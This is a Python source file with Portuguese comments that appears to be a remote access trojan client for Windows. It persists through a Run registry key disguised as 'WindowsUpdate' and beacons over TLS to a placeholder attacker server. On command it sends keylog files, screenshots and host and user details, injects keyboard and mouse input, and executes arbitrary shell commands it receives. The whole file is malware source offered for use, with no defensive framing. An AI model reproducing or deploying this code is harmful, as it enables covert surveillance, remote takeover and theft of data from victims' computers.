import socket
import ssl
import subprocess
import pyscreenshot
import winreg
import sys
import os
import time
import keyboard
import pyautogui
import uuid
import json

SERVER_IP = "IP_DA_VPS"  # Substituir pelo IP da VPS
SERVER_PORT = 443
CERT = "server.pem"      # Certificado do servidor

# Configurações do WOL
MAC_ADDRESS = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff)
                      for elements in range(0,2*6,2)][::-1])
BROADCAST_IP = "255.255.255.255"
WOL_PORT = 9

def add_to_startup():
    # Persistência via registro do Windows
    key = winreg.HKEY_CURRENT_USER
    path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    try:
        with winreg.OpenKey(key, path, 0, winreg.KEY_WRITE) as regkey:
            winreg.SetValueEx(regkey, "WindowsUpdate", 0, winreg.REG_SZ, sys.executable)
    except:
        pass

def connect_to_server():
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    context.load_verify_locations(CERT)
    
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            ssl_sock = context.wrap_socket(s, server_hostname=SERVER_IP)
            ssl_sock.connect((SERVER_IP, SERVER_PORT))
            return ssl_sock
        except:
            time.sleep(60)

def send_screenshot(conn):
    img = pyscreenshot.grab()
    img.save("temp.png")
    with open("temp.png", "rb") as f:
        conn.send(f.read())
    os.remove("temp.png")

def handle_remote_control(cmd_data):
    try:
        cmd = json.loads(cmd_data)
        if cmd['type'] == 'keyboard':
            keyboard.write(cmd['key'])
        elif cmd['type'] == 'mouse_move':
            pyautogui.moveTo(cmd['x'], cmd['y'])
        elif cmd['type'] == 'mouse_click':
            pyautogui.click(button=cmd['button'])
        elif cmd['type'] == 'mouse_doubleclick':
            pyautogui.doubleClick()
        elif cmd['type'] == 'mouse_scroll':
            pyautogui.scroll(cmd['clicks'])
        elif cmd['type'] == 'hotkey':
            keyboard.press_and_release(cmd['keys'])
    except Exception as e:
        return f"Erro no controle remoto: {str(e)}"
    return "Comando executado com sucesso"

def send_system_info():
    info = {
        'mac': MAC_ADDRESS,
        'hostname': socket.gethostname(),
        'ip': socket.gethostbyname(socket.gethostname()),
        'os': sys.platform,
        'username': os.getlogin()
    }
    return json.dumps(info)

def main():
    add_to_startup()
    
    while True:
        try:
            conn = connect_to_server()
            while True:
                cmd = conn.recv(1024).decode()
                if cmd == "GET_LOGS":
                    with open("keylogs.txt", "rb") as f:
                        conn.send(f.read())
                elif cmd == "CAPTURE_SCREEN":
                    send_screenshot(conn)
                elif cmd == "GET_SYSTEM_INFO":
                    conn.send(send_system_info().encode())
                elif cmd.startswith("REMOTE_CONTROL:"):
                    result = handle_remote_control(cmd[14:])
                    conn.send(result.encode())
                else:
                    # Executa comandos do sistema
                    result = subprocess.getoutput(cmd)
                    conn.send(result.encode())
        except:
            pass

if __name__ == "__main__":
    main() 